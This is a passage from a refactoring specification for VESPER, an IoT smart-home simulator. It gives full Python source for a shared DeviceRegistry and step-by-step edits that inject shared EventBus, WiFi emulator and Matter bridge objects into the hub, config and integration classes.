        self.matter_bridge = None

        if self.wifi_network:
            try:
                self.wifi_network.stop()
            except Exception as e:
                logger.warning("Error stopping WiFi emulator: %s", e)

        self.agent_controller.destroy_all()

        if self.simulator:
            self.simulator.close()

        logger.info("VesperEngine closed")

    # ── Context manager ───────────────────────────────────────────

    def __enter__(self) -> "VesperEngine":
        self.initialize()
        return self

    def __exit__(self, *args) -> None:
        self.close()
```

### 3.2 `vesper/core/event_bus.py` — EventBus (KEEP, minimal addition)

**Purpose**: Thread-safe priority-queue pub/sub system.

**Key classes**: `Event`, `EventBus`, `EventPriority`, `EventHandler`

**Tools**: stdlib only (threading, queue, json, uuid)

**Lines**: 323 — core logic unchanged. **One addition**: singleton guard (6 lines at module scope + 4 lines in `__init__`) as specified in Section 2.5 singleton guard implementation. The PriorityQueue, dispatch, subscription, and stats logic is NOT modified.

#### 3.2.1 EventBus Delivery Semantics (VERIFIED FROM SOURCE)

These semantics are verified from the actual `event_bus.py` implementation (323 lines). All components MUST be designed around these guarantees — do not assume stronger properties.

| Property | Guarantee | Source evidence |
|----------|-----------|-----------------|
| **Dispatch model** | **Synchronous, in-thread**. `process_events(max_events)` drains the queue in the caller's thread. Each handler is called sequentially in `_dispatch_event()`. There is NO background thread, NO async dispatch. | `_dispatch_event()` calls `handler(event)` directly in a for-loop |
| **Delivery guarantee** | **At-most-once**. If a handler raises an exception, the exception is caught and logged — the event is NOT retried, NOT re-queued. Other handlers for the same event type still execute. | `except Exception as e: logger.error(...)` in `_dispatch_event()`, no retry logic |
| **Ordering** | **Priority-first, then FIFO within same priority**. Uses `PriorityQueue` with `(priority, sequence_number, event)` tuples. Lower priority value = higher priority. Within same priority, insertion order preserved via monotonic sequence counter. | `self._queue = PriorityQueue(maxsize=max_queue_size)` with `(event.priority.value, self._event_counter, event)` |
| **Queue overflow** | **Events silently dropped**. When `PriorityQueue` is full (default `max_queue_size=1000`), `publish()` catches `queue.Full` and increments `self._stats["events_dropped"]`. No backpressure, no exception raised to publisher. | `except Full: self._stats["events_dropped"] += 1` |
| **Wildcard subscriptions** | **Supported via `"*"` event type**. Handlers subscribed to `"*"` receive ALL events. Pattern matching uses exact string match (no glob, no regex). | `if event_type == "*"` check in `_dispatch_event()` |
| **Thread safety** | **`threading.RLock`** protects `subscribe()`/`unsubscribe()`. `publish()` uses `PriorityQueue.put()` which is inherently thread-safe. `process_events()` is NOT thread-safe — must be called from one thread (the engine's main loop). | `self._lock = threading.RLock()` in `__init__`, `with self._lock:` in subscribe/unsubscribe |
| **Handler mutation** | **Handlers MAY mutate DeviceRegistry**. Since dispatch is synchronous, a handler that calls `registry.update_state()` will trigger registry callbacks before the next handler executes. This is intentional — it allows cascading state updates within a single tick. | No restriction in code; handlers receive full Event object |
| **Stats tracking** | Tracks `events_published`, `events_processed`, `events_dropped`, `events_by_type` (Counter), `processing_time_ms`. Accessible via `event_bus.stats` property. | `self._stats` dict in `__init__`, updated in publish/process/dispatch |

**Design implications for all components**:

1. **Always call `process_events()` in the main loop** — events are NOT auto-delivered. If you forget, the queue fills silently and events are dropped.
2. **Keep handlers fast** — they block the main loop. Long-running work should be queued for async processing.
3. **Don't rely on event ordering across priorities** — a `CRITICAL` event will be processed before a `NORMAL` event even if published later.
4. **Monitor `events_dropped`** — if > 0 after a run, either handlers are too slow or the queue is too small.
5. **Handlers must be idempotent-safe** — since there's no exactly-once guarantee, a handler may see stale state if another handler mutated the registry first.

### 3.3 `vesper/core/registry.py` — DeviceRegistry (NEW)

**Purpose**: Single source of truth for all device state. Replaces the 4 separate registries.

**Key classes**: `DeviceEntry`, `DeviceRegistry`, `StateChangeCallback`

**Tools**: stdlib only (threading, time, logging)

**Used by**: VesperEngine, VirtualHub, WiFiEmulator, AttackSurface, Evaluator, Dashboard

**Full implementation** — copy this file verbatim to `vesper/core/registry.py`:

```python
"""
Canonical Device Registry for VESPER.

Single source of truth for all device state. Replaces the 4 separate
registries (Environment._devices, VirtualHub._devices,
integrations/device_registry, IoTDeviceManager) with one thread-safe
shared store.

Every layer (Engine, Hub, WiFi, Evaluator, Dashboard) reads from and
writes to this registry. State-change callbacks allow reactive updates.
"""

from __future__ import annotations

import logging
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger(__name__)

# Type alias for state-change callbacks
StateChangeCallback = Callable[[str, Dict[str, Any], Dict[str, Any]], None]


@dataclass
class DeviceEntry:
    """A device registered in the canonical registry."""
    device_id: str
    device_type: str            # motion_sensor, contact_sensor, light, ...
    protocol: str = "matter"    # matter | smartthings | homeassistant
    name: str = ""
    room: str = ""
    zone_id: str = ""
    state: Dict[str, Any] = field(default_factory=dict)
    online: bool = True
    last_seen: float = 0.0
    ip_address: Optional[str] = None
    mac_address: Optional[str] = None
    wifi_station: Optional[str] = None   # e.g. "sta1"
    manufacturer: str = ""
    model: str = ""
    firmware_version: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize to dict for JSON/dashboard."""
        return {
            "device_id": self.device_id,
            "device_type": self.device_type,
            "protocol": self.protocol,
            "name": self.name,
            "room": self.room,
            "zone_id": self.zone_id,
            "state": dict(self.state),
            "online": self.online,
            "last_seen": self.last_seen,
            "ip_address": self.ip_address,
            "mac_address": self.mac_address,
            "wifi_station": self.wifi_station,
            "manufacturer": self.manufacturer,
            "model": self.model,
            "firmware_version": self.firmware_version,
            "metadata": dict(self.metadata),
        }


class DeviceRegistry:
    """
    Thread-safe canonical device registry.

    Created once in VesperEngine, injected into every component.
    Optionally publishes state-change events on the EventBus.
    """

    def __init__(self, event_bus=None):
        self._devices: Dict[str, DeviceEntry] = {}
        self._lock = threading.Lock()
        self._event_bus = event_bus
        self._listeners: List[StateChangeCallback] = []

    # —— Registration ——————————————————————————————————————

    def register(self, device_id: str, entry: DeviceEntry) -> None:
        """Register a new device. Raises ValueError if already exists."""
        with self._lock:
            if device_id in self._devices:
                raise ValueError(f"Device {device_id} already registered")
            entry.device_id = device_id
            entry.last_seen = time.time()
            self._devices[device_id] = entry
        logger.debug("Registry: registered %s (%s)", device_id, entry.device_type)
        self._publish_event("device.registered", device_id, {}, entry.state)

    def register_or_update(self, device_id: str, entry: DeviceEntry) -> None:
        """Register a device, or update if it already exists."""
        with self._lock:
            entry.device_id = device_id
            entry.last_seen = time.time()
            self._devices[device_id] = entry
        logger.debug("Registry: register_or_update %s", device_id)

    def unregister(self, device_id: str) -> bool:
        """Remove a device from the registry."""
        with self._lock:
            entry = self._devices.pop(device_id, None)
        if entry:
            logger.debug("Registry: unregistered %s", device_id)
            self._publish_event("device.unregistered", device_id, entry.state, {})
            return True
        return False

    # —— Lookup ————————————————————————————————————————————

    def get(self, device_id: str) -> Optional[DeviceEntry]:
        """Get a device by ID (returns None if not found)."""
        with self._lock:
            return self._devices.get(device_id)

    def all_devices(self) -> List[DeviceEntry]:
        """Return a list of all registered devices."""
        with self._lock:
            return list(self._devices.values())

    def by_type(self, device_type: str) -> List[DeviceEntry]:
        """Get all devices of a given type."""
        with self._lock:
            return [d for d in self._devices.values() if d.device_type == device_type]

    def by_room(self, room: str) -> List[DeviceEntry]:
        """Get all devices in a room."""
        with self._lock:
            return [d for d in self._devices.values() if d.room == room]

    def by_protocol(self, protocol: str) -> List[DeviceEntry]:
        """Get all devices using a protocol."""
        with self._lock:
            return [d for d in self._devices.values() if d.protocol == protocol]

    @property
    def count(self) -> int:
        """Number of registered devices."""
        return len(self._devices)

    # —— State updates —————————————————————————————————————

    def update_state(self, device_id: str, new_state: Dict[str, Any]) -> bool:
        """
        Merge ``new_state`` into the device's current state.

        Fires state-change callbacks and EventBus event.
        Returns False if device not found.
        """
        with self._lock:
            entry = self._devices.get(device_id)
            if not entry:
                return False
            old_state = dict(entry.state)
            entry.state.update(new_state)
            entry.last_seen = time.time()

        # Notify listeners (outside lock)
        for cb in self._listeners:
            try:
                cb(device_id, old_state, entry.state)
            except Exception as exc:
                logger.error("Registry listener error: %s", exc)

        self._publish_event("device.state_changed", device_id, old_state, entry.state)
        return True

    def set_online(self, device_id: str, online: bool) -> None:
        """Update a device's online status."""
        with self._lock:
            entry = self._devices.get(device_id)
            if entry:
                entry.online = online
                entry.last_seen = time.time()

    # —— Listeners / callbacks —————————————————————————————

    def add_listener(self, callback: StateChangeCallback) -> None:
        """Register a callback invoked on every state change."""
        self._listeners.append(callback)

    # —— Snapshot ——————————————————————————————————————————

    def snapshot(self) -> Dict[str, Any]:
        """Return a serializable snapshot of the full registry."""
        with self._lock:
            return {
                "device_count": len(self._devices),
                "devices": {
                    did: entry.to_dict()
                    for did, entry in self._devices.items()
                },
            }

    # —— Private helpers ———————————————————————————————————

    def _publish_event(
        self,
        event_type: str,
        device_id: str,
        old_state: Dict[str, Any],
        new_state: Dict[str, Any],
    ) -> None:
        """Publish a device event on the shared EventBus (if available)."""
        if self._event_bus is None:
            return
        try:
            from vesper.core.event_bus import Event
            self._event_bus.publish(Event(
                event_type=event_type,
                source_id=device_id,
                payload={
                    "device_id": device_id,
                    "old_state": old_state,
                    "new_state": new_state,
                },
            ))
        except Exception as exc:
            logger.debug("Registry EventBus publish error: %s", exc)

    def __len__(self) -> int:
        return len(self._devices)

    def __contains__(self, device_id: str) -> bool:
        return device_id in self._devices

    def __repr__(self) -> str:
        return f"DeviceRegistry({len(self._devices)} devices)"
```

### 3.4 `vesper/core/environment.py` — Environment (MODIFY)

**Purpose**: Manages 3D spatial environment, zones, device placement.

**Change**: Accept an optional `DeviceRegistry` in the constructor. Keep the internal `_devices` dict for IoTDevice objects (needed for `.update(dt)` calls), but **also** register each device in the shared registry.

**Tools**: `vesper.config`, `vesper.core.event_bus`, `vesper.core.registry`

**Exact edits**:

1. Add import at top of file:
```python
from vesper.core.registry import DeviceRegistry, DeviceEntry
```

2. Change `__init__` signature — add `registry` parameter:
```python
# BEFORE:
def __init__(self, config=None, event_bus=None):

# AFTER:
def __init__(self, config=None, event_bus=None, registry=None):
    # ... existing code ...
    self._registry = registry  # shared DeviceRegistry (optional)
```

3. In `register_device()`, also register in the shared registry:
```python
# ADD at the end of register_device(), after self._devices[device.device_id] = device:
    if self._registry:
        self._registry.register_or_update(
            device.device_id,
            DeviceEntry(
                device_id=device.device_id,
                device_type=device.device_type,
                room=zone_id or "",
                zone_id=zone_id or "",
            ),
        )
```

4. In `unregister_device()`, also remove from registry:
```python
# ADD after del self._devices[device_id]:
    if self._registry:
        self._registry.unregister(device_id)
```

5. Update `device_count` property to use registry when available:
```python
@property
def device_count(self) -> int:
    if self._registry:
        return self._registry.count
    return len(self._devices)
```

#### 3.4.1 State Ownership & Consistency Model

Two structures hold device information. They serve **different purposes** and are NOT redundant:

| Structure | Owner | Holds | Purpose | Read pattern | Write pattern |
|-----------|-------|-------|---------|-------------|---------------|
| `Environment._devices` | `Environment` | `IoTDevice` objects (Python instances with `.update(dt)` method) | **Tick-level simulation**: physics updates, sensor readings, spatial queries, zone membership | Called every tick by `Environment.tick(dt)` → `device.update(dt)` | `Environment.register_device(device)` only (at setup time) |
| `DeviceRegistry._devices` | `DeviceRegistry` (via `VesperEngine`) | `DeviceEntry` dataclasses (serializable state dicts) | **Canonical state**: REST API reporting, Hub routing, Matter bridge sync, evaluation metrics, dashboard display | Any component can call `registry.get(id)`, `registry.all_devices()`, `registry.by_room()` | `registry.update_state(id, new_state)` — fires callbacks + EventBus event |

**Sync path** (Environment → Registry):

```
Environment.register_device(device)
  └─► if self._registry:
        self._registry.register_or_update(device.device_id, DeviceEntry(...))

IoTDevice.update(dt) → state changes
  └─► device publishes Event("sensor.reading", ...) on EventBus
        └─► MatterFirmwareBridge handler receives event
              └─► Hub.set_device_state(device_id, new_state)
                    └─► DeviceRegistry.update_state(device_id, new_state)
                          └─► fires StateChangeCallback listeners
                          └─► publishes Event("device.state_changed", ...)
```

**Sync path** (Registry → Environment): **NONE by design.** The registry is the external-facing state. Environment holds simulation-internal objects. If an external command changes state (e.g., Home Assistant turns on a light), the path is:

```
HA WebSocket event → Hub._ha_event_listener()
  └─► DeviceRegistry.update_state(device_id, new_state)
  └─► EventBus.publish("device.state_changed", ...)
        └─► Environment's EventBus handler (if subscribed) can update IoTDevice
```

**Consistency checker** (strict mode): Add to `VesperEngine._verify_invariants()`:

```python
# Check that every device in Environment._devices has a corresponding entry in DeviceRegistry
for device_id in self.environment._devices:
    if device_id not in self.registry:
        errors.append(f"INV-2: device {device_id} in Environment but not in DeviceRegistry")

# Check the reverse (optional — registry may have devices not in Environment,
# e.g., firmware-only devices)
```

### 3.5 `vesper/config.py` — Config (MODIFY)

**Purpose**: Pydantic models for YAML config. **Must parse ALL sections.**

**Changes**:
1. Add `NetworkConfig` and `FirmwareConfig` to the root `Config` model so the YAML `network:` and `firmware:` sections are actually loaded.
2. Add `strict_mode` field to `SimulationConfig`:
```python
class SimulationConfig(BaseModel):
    # ... existing fields ...
    strict_mode: bool = Field(default=True, description="Strict architecture invariant enforcement (Section 2.5)")
```

**Exact edit**: Insert these new model classes **after** `DashboardConfig` and **before** `class Config`. Then add `network` and `firmware` fields to `Config`.

**New models to add** (insert after `DashboardConfig`, before `Config`):

```python
# ── Network Config (NEW — parses YAML `network:` section) ─────────────────

class WiFiNetworkConfig(BaseModel):
    """WiFi network parameters for the emulated network."""
    enabled: bool = Field(default=True, description="Enable WiFi emulation")
    ssid: str = Field(default="VESPER-IoT-Network", description="WiFi SSID")
    password: str = Field(default="vesper-secure-2026", description="WiFi password")
    channel: int = Field(default=6, description="WiFi channel")
    mode: str = Field(default="g", description="802.11 mode (g/n)")
    encrypt: str = Field(default="wpa2", description="Encryption type")


class MatterBridgeNetConfig(BaseModel):
    """Matter bridge network settings."""
    host: str = Field(default="192.168.4.1", description="Bridge host IP")
    port: int = Field(default=8484, description="Bridge REST API port")
    commissioning_port: int = Field(default=5540, description="Matter commissioning port")
    tls_enabled: bool = Field(default=False, description="Enable TLS on bridge")


class FirewallConfig(BaseModel):
    """Firewall configuration for the emulated network."""
    enabled: bool = Field(default=True, description="Enable firewall rules")
    ap_isolation: bool = Field(default=False, description="Isolate WiFi stations")
    syn_flood_protection: bool = Field(default=True, description="Enable SYN flood protection")
    syn_rate_limit: str = Field(default="25/sec", description="SYN rate limit")
    syn_burst: int = Field(default=50, description="SYN burst limit")
    icmp_rate_limit: str = Field(default="10/sec", description="ICMP rate limit")
    allowed_services: list = Field(
        default_factory=lambda: [53, 67, 123, 8484, 443, 5540],
        description="Allowed service ports",
    )
    drop_invalid: bool = Field(default=True, description="Drop invalid packets")
    log_dropped: bool = Field(default=True, description="Log dropped packets")
    log_prefix: str = Field(default="VESPER-FW-DROP: ", description="Log prefix")


class WiresharkConfig(BaseModel):
    """Packet capture configuration."""
    enabled: bool = Field(default=False, description="Enable packet capture")
    capture_interface: str = Field(default="ap1-wlan1", description="Capture interface")
    capture_filter: str = Field(default="", description="BPF capture filter")
    pcap_dir: str = Field(default="results/pcap", description="Directory for pcap files")


class NetworkConfig(BaseModel):
    """Configuration for the emulated network layer."""
    wifi: WiFiNetworkConfig = Field(default_factory=WiFiNetworkConfig)
    subnet: str = Field(default="192.168.4.0/24", description="Network subnet")
    gateway: str = Field(default="192.168.4.1", description="Gateway IP")
    matter_bridge: MatterBridgeNetConfig = Field(default_factory=MatterBridgeNetConfig)
    firewall: FirewallConfig = Field(default_factory=FirewallConfig)
    wireshark: WiresharkConfig = Field(default_factory=WiresharkConfig)


# ── Firmware Config (NEW — parses YAML `firmware:` section) ────────────────

class FreeRTOSConfig(BaseModel):
    """FreeRTOS configuration for ESP32 firmware."""
    unicore: bool = Field(default=True, description="Run on single core")
    tick_rate_hz: int = Field(default=1000, description="FreeRTOS tick rate")


class FirmwareConfig(BaseModel):
    """Configuration for ESP32 firmware emulation."""
    backend: str = Field(default="esp32", description="Firmware backend")
    qemu_binary: str = Field(default="qemu-system-xtensa", description="QEMU binary path")
    esp_idf_version: str = Field(default="v5.2", description="ESP-IDF version")
    serial_port_base: int = Field(default=5561, description="Base serial TCP port")
    smartthings_sdk: bool = Field(default=True, description="Enable SmartThings SDK")
    freertos: FreeRTOSConfig = Field(default_factory=FreeRTOSConfig)
```

**Updated root Config class** (replace the existing `Config` class):

```python
class Config(BaseModel):
    """Root configuration for Vesper."""
    simulation: SimulationConfig = Field(default_factory=SimulationConfig)
    environment: EnvironmentConfig = Field(default_factory=EnvironmentConfig)
    devices: DevicesConfig = Field(default_factory=DevicesConfig)
    event_bus: EventBusConfig = Field(default_factory=EventBusConfig)
    logging: LoggingConfig = Field(default_factory=LoggingConfig)
    hub: HubConfig = Field(default_factory=HubConfig)
    matter: MatterConfig = Field(default_factory=MatterConfig)
    dashboard: DashboardConfig = Field(default_factory=DashboardConfig)
    network: NetworkConfig = Field(default_factory=NetworkConfig)      # ← NEW
    firmware: FirmwareConfig = Field(default_factory=FirmwareConfig)    # ← NEW
```

### 3.6 `vesper/network/wifi_emulator.py` — WiFiEmulator (MODIFY)

**Purpose**: Emulated 802.11 network (Mininet-WiFi Docker or sim fallback).

**Changes**:
1. Rename `TrafficRecord` → `WiFiTrafficRecord` (avoid collision with hub)
2. Accept optional `DeviceRegistry` in constructor
3. Remove MQTT backward-compat aliases (`send_mqtt`, `subscribe_mqtt`, `_check_mqtt`)

**Tools**: subprocess, requests, threading, time, random, json

**Exact edits**:

1. **Rename class**: Find `class TrafficRecord:` and rename to `class WiFiTrafficRecord:`

2. **Update all references** inside the file: `TrafficRecord(` → `WiFiTrafficRecord(` (appears in `route_to_bridge()` and `TrafficTracker` type hints)

3. **Add `registry` parameter** to `WiFiEmulator.__init__`:
```python
# BEFORE:
def __init__(self, wifi_config=None, devices=None, compose_file=None, project_root=None):

# AFTER:
def __init__(self, wifi_config=None, devices=None, compose_file=None, project_root=None, registry=None):
    # ... existing code ...
    self._registry = registry  # shared DeviceRegistry (optional)
```

4. **Add strict-mode caller check to `route_to_bridge()`** — direct calls are forbidden in strict mode unless the caller is `VirtualHub`:
```python
# At the top of route_to_bridge(), before sending traffic:
import inspect
import vesper.core.event_bus as _eb_mod

if getattr(_eb_mod, "_STRICT_MODE", False):
    caller_names = {frame.function for frame in inspect.stack()[1:6]}
    if "_publish_matter" not in caller_names and "set_device_state" not in caller_names and "send_command" not in caller_names:
        raise RuntimeError(
            "STRICT MODE: WiFiEmulator.route_to_bridge() called directly. "
            "All bridge traffic must originate from VirtualHub (INV-4)."
        )
```

This is a **policy guard**, not a security boundary. It prevents accidental architecture drift during implementation. It is acceptable because strict mode is an internal correctness mode, not an adversarial sandbox.

5. **Delete these 3 lines** (MQTT aliases):
```python
    send_mqtt = send_matter           # DELETE
    subscribe_mqtt = subscribe_matter  # DELETE
    _check_mqtt = _check_matter_bridge # DELETE
```

**Resulting key classes**:

```python
@dataclass
class WiFiTrafficRecord:    # RENAMED from TrafficRecord
    timestamp: float
    src_station: str
    src_ip: str
    dst_ip: str
    method: str
    path: str
    request_bytes: int
    response_bytes: int
    latency_ms: float
    status_code: int
    device_id: str
    success: bool
    via_wifi: bool

class TrafficTracker:
    def record(self, rec: WiFiTrafficRecord): ...
    def summary(self) -> dict: ...
    @property
    def total_packets(self) -> int: ...
    @property
    def total_bytes(self) -> int: ...

class WiFiEmulator:
    def __init__(self, config=None, registry=None):
        self.registry = registry          # NEW — shared registry
        self.traffic = TrafficTracker()
    
    def route_to_bridge(self, device_id, method, path, payload) -> dict:
        """Single entry point for ALL Matter bridge traffic.

        Strict mode guard: may only be called from VirtualHub.
        """
    
    def start(self): ...       # Docker mode
    def start_router_only(self): ...
    def stop(self): ...
    
    # REMOVED: send_mqtt(), subscribe_mqtt() (dead MQTT aliases)
```

### 3.7 `vesper/hub/base.py` — Hub base (MODIFY)

**Change**: Rename `TrafficRecord` → `HubTrafficRecord`.

**Exact edits**:

1. **Rename class**: Find `class TrafficRecord:` (the `@dataclass` one) and rename to `class HubTrafficRecord:`
2. **Update all type hints** in `BaseHub`: `TrafficRecord` → `HubTrafficRecord` (in `_traffic_log`, `_traffic_callbacks`, `record_traffic()`, `get_traffic_log()`, `on_traffic()`)
3. **Update `hub/__init__.py`** if it exports `TrafficRecord` — rename to `HubTrafficRecord`

**Result**:
```python
@dataclass
class HubTrafficRecord:     # RENAMED from TrafficRecord
    timestamp: float
    source_id: str
    target_id: str
    protocol: str            # matter | homeassistant | smartthings
    direction: str           # inbound | outbound | internal
    topic: str
    payload_size: int
    payload_summary: str
    latency_ms: float
    metadata: dict
```

### 3.8 `vesper/hub/virtual_hub.py` — VirtualHub (MODIFY)

**Purpose**: Central traffic router. ALL device communication goes through here.

**Changes**:
1. Accept `DeviceRegistry`, `WiFiEmulator`, `MatterBridgeClient`, `EventBus` via constructor injection (no more internal instantiation)
2. Use `HubTrafficRecord` (renamed from `TrafficRecord`)
3. Route `_publish_matter()` through `WiFiEmulator.route_to_bridge()` when WiFi is available
4. Remove `_connect_matter_bridge()` method (matter bridge is injected)

**Exact edits**:

1. **Update import**: `from vesper.hub.base import ... TrafficRecord` → `HubTrafficRecord`

2. **Replace constructor signature**:
```python
# BEFORE:
def __init__(
    self,
    hub_id: str = "vesper-virtual-hub",
    name: str = "VESPER Virtual Hub",
    matter_bridge_url: str = "http://localhost:8484",
    mqtt_host: str = "",
    mqtt_port: int = 0,
    ha_url: Optional[str] = None,
    ha_token: Optional[str] = None,
):

# AFTER:
def __init__(
    self,
    hub_id: str = "vesper-virtual-hub",
    name: str = "VESPER Virtual Hub",
    event_bus=None,          # injected
    registry=None,           # shared DeviceRegistry
    wifi_network=None,       # shared WiFiEmulator
    matter_bridge=None,      # shared MatterBridgeClient
    matter_bridge_url: str = "http://localhost:8484",  # kept for compat
    ha_url: Optional[str] = None,
    ha_token: Optional[str] = None,
):
```

3. **Inside `__init__` body**: Use injected deps instead of creating:
```python
    self._matter_bridge = matter_bridge  # use injected (no more _connect_matter_bridge)
    self._wifi_network = wifi_network
    self._registry = registry
    self._event_bus = event_bus
    self._matter_bridge_url = matter_bridge_url  # fallback URL
```

4. **In `start()`**: Replace `await self._connect_matter_bridge()` with a strict-mode-aware fallback:
```python
    if self._matter_bridge is None and self._matter_bridge_url:
        import vesper.core.event_bus as _eb_mod
        if getattr(_eb_mod, '_STRICT_MODE', False):
            raise RuntimeError(
                "STRICT MODE: VirtualHub.start() has no injected MatterBridgeClient. "
                "In strict mode, all shared objects must be injected by VesperEngine (INV-3)."
            )
        logger.warning("COMPAT MODE: VirtualHub creating its own MatterBridgeClient (not recommended)")
        await self._connect_matter_bridge()  # fallback if not injected
```

    **Important**: Keep only this strict-mode-aware version in the final file. Do NOT leave any older snippet that shows unconditional fallback bridge creation.

5. **In `_publish_matter()`**: Route through WiFi when available. **In strict mode, direct bridge fallback is forbidden** — all traffic MUST pass through WiFi (INV-4). In compatibility mode, direct bridge access is allowed with a warning:
```python
# BEFORE:
    self._matter_bridge.update_state_sync(device_id, state)

# AFTER:
    if self._wifi_network:
        self._wifi_network.route_to_bridge(
            device_id, "PUT",
            f"/devices/{device_id}/state", state,
        )
    elif self._matter_bridge:
        # Strict mode: WiFi is mandatory for bridge traffic (INV-4)
        import vesper.core.event_bus as _eb_mod
        if getattr(_eb_mod, '_STRICT_MODE', False):
            raise RuntimeError(
                f"STRICT MODE: _publish_matter() called without WiFiNetwork. "
                f"All bridge traffic must route through WiFi (INV-4). "
                f"Either enable WiFi or use strict=False."
            )
        logger.warning("COMPAT MODE: direct bridge access (bypassing WiFi) for %s", device_id)
        self._matter_bridge.update_state_sync(device_id, state)
    else:
        logger.error("No WiFi network and no MatterBridge — cannot publish state for %s", device_id)
```

6. **Replace all `TrafficRecord(`** with `HubTrafficRecord(` throughout the file

**Tools**: asyncio, aiohttp, vesper.core.registry, vesper.matter.bridge_client, vesper.network.wifi_emulator

```python
class VirtualHub(BaseHub):
    def __init__(
        self,
        hub_id="vesper-virtual-hub",
        name="VESPER Virtual Hub",
        event_bus=None,          # NEW — injected
        registry=None,           # NEW — shared DeviceRegistry
        wifi_network=None,       # NEW — shared WiFiEmulator
        matter_bridge=None,      # NEW — shared MatterBridgeClient
        ha_url=None,
        ha_token=None,
    ):
        # NO MORE creating its own MatterBridgeClient
        self._matter_bridge = matter_bridge   # use the injected one
        self._wifi_network = wifi_network
        self._registry = registry
        self._event_bus = event_bus
```

### 3.9 `vesper/matter/bridge_client.py` — MatterBridgeClient (KEEP, minor)

**Purpose**: REST client to the matter.js bridge (:8484).

**Change**: No structural changes. Just ensure it's created ONCE in `VesperEngine` and passed to Hub/WiFi.

**Tools**: httpx (async), requests (sync), json

**Lines**: 273 — mostly fine as-is.

### 3.10 `vesper/habitat/vesper_integration.py` — VesperIntegration (MAJOR REFACTOR)

**Purpose**: Was the 822-line god class. Refactor to accept injected shared dependencies instead of creating its own.

#### 3.10.0 Scope Freeze: What VesperIntegration IS and IS NOT

After the refactor, `VesperIntegration` is a **scene-specific coordinator**. It wires Habitat 3D objects (humanoid, IoT overlays, LLM tasks) to the shared infrastructure. It does NOT own any shared infrastructure.

**VesperIntegration IS responsible for (KEEP)**:
- `init_iot()` — placing IoT device overlays in the Habitat 3D scene
- `init_humanoid()` — spawning the humanoid avatar
- `init_llm()` — connecting to LM Studio for task generation
- `set_scene()` — binding scene ID + room list
- `create_task()` / `generate_task_from_llm()` / `start_task()` / `complete_current_task()`
- `update_agent_position()` — humanoid navigation + device proximity triggers
- `update_humanoid()` — physics stepping for the humanoid
- `interact_with_device()` — agent↔device interaction
- `render()` — 3D rendering overlay
- All read-only properties (`stats`, `get_recent_events()`, `get_automation_rules()`)

**VesperIntegration is NOT responsible for (REMOVED — owned by VesperEngine)**:
- ❌ Creating EventBus → injected via constructor
- ❌ Creating MatterBridgeClient → injected via constructor
- ❌ Creating WiFiEmulator → injected via constructor
- ❌ Creating DeviceRegistry → injected via constructor
- ❌ Managing bridge lifecycle (`_init_matter_bridge()` deleted)
- ❌ Managing WiFi lifecycle (cleanup moved to VesperEngine.close())
- ❌ TAP engine ownership → TAP engine reads from shared EventBus

**Migration invariant**: After refactoring, `VesperIntegration` constructor MUST accept `event_bus`, `registry`, `matter_bridge`, `wifi_network` as keyword arguments. It MUST NOT contain any `EventBus()`, `DeviceRegistry()`, `MatterBridgeClient()`, or `WiFiEmulator()` constructor calls.

**Changes**: Split responsibilities:

| Responsibility | Moves to |
|---|---|
| IoT device setup + overlay | `vesper/habitat/iot_setup.py` (new) |
| Humanoid avatar | already in `vesper/habitat/humanoid.py` (keep) |
| LLM task generation | already in `vesper/agents/llm_client.py` + `vesper/simulation/task_generator.py` (keep) |
| TAP rule engine | already in `vesper/automation/tap_engine.py` (keep) |
| Matter bridge init | moves to `VesperEngine._setup_matter()` |
| WiFi emulator init | moves to `VesperEngine._setup_wifi()` |
| EventBus creation | moves to `VesperEngine.__init__()` |
| Navigation task queue | `vesper/habitat/task_manager.py` (already exists) |
| `update_agent_position()` logic | stays in `vesper_integration.py` but slimmed down |

**Exact edits (in order)**:

1. **Change constructor** — accept injected shared deps, stop creating EventBus/MatterBridge/WiFi:
```python
# BEFORE:
def __init__(
    self,
    config: Optional[VesperConfig] = None,
):
    self.config = config or VesperConfig()
    # ... lots of None assignments ...
    self._event_bus = None
    self._tap_engine = None
    self._matter_bridge = None
    self._wifi_emulator = None
    # ...

# AFTER:
def __init__(
    self,
    config: Optional[VesperConfig] = None,
    event_bus=None,          # injected by VesperEngine
    registry=None,           # injected DeviceRegistry
    matter_bridge=None,      # injected MatterBridgeClient
    wifi_network=None,       # injected WiFiEmulator
):
    self.config = config or VesperConfig()
    # Injected shared deps
    self._event_bus = event_bus
    self._registry = registry
    self._matter_bridge = matter_bridge
    self._wifi_emulator = wifi_network
    # Keep the rest (iot_manager, humanoid, llm_client, tasks, etc.)
    self._iot_manager = None
    self._iot_renderer = None
    self._iot_bridge = None
    self._config_menu = None
    self._humanoid = None
    self._humanoid_renderer = None
    self._llm_client = None
    self._tap_engine = None
    self.scene_id = None
    self.rooms = []
    self.tasks = []
    self.current_task = None
    self._task_counter = 0
    self._devices_interacted = 0
    self._tasks_completed = 0
```

2. **Delete `_init_matter_bridge()`** method entirely (lines ~185-213). Matter bridge is now injected.

3. **Modify `init_iot()`** — remove the EventBus creation block:
```python
# DELETE these lines from init_iot() (around line 156-163):
    if self._event_bus is None:
        from vesper.core.event_bus import EventBus as _EventBus
        self._event_bus = _EventBus(
            enable_logging=True,
            log_file="logs/eventbus.jsonl",
        )

# DELETE these lines from init_iot() (around line 168-169):
    if self.config.enable_matter:
        self._init_matter_bridge()
```

4. **Modify `close()`** — remove WiFi/Matter cleanup (engine owns them):
```python
# BEFORE:
def close(self) -> None:
    self._matter_bridge = None
    if self._wifi_emulator:
        try:
            self._wifi_emulator.stop()
        except Exception as e:
            logger.warning(f"Error stopping WiFi emulator: {e}")

# AFTER:
def close(self) -> None:
    """Release local resources (shared deps are owned by VesperEngine)."""
    self._iot_manager = None
    self._iot_bridge = None
    self._tap_engine = None
```

5. **Update `create_vesper_integration()` factory** at bottom of file:
```python
# BEFORE:
def create_vesper_integration(
    scene_id, rooms, config=None, sim=None, initial_position=None, llm_endpoint=None,
) -> VesperIntegration:
    integration = VesperIntegration(config)
    # ...

# AFTER:
def create_vesper_integration(
    scene_id, rooms, config=None, sim=None, initial_position=None, llm_endpoint=None,
    event_bus=None, registry=None, matter_bridge=None, wifi_network=None,
) -> VesperIntegration:
    integration = VesperIntegration(
        config,
        event_bus=event_bus,
        registry=registry,
        matter_bridge=matter_bridge,
        wifi_network=wifi_network,
    )
    # ... rest unchanged ...
```

**Keep unchanged**: `init_humanoid()`, `init_llm()`, `set_scene()`, `create_task()`,
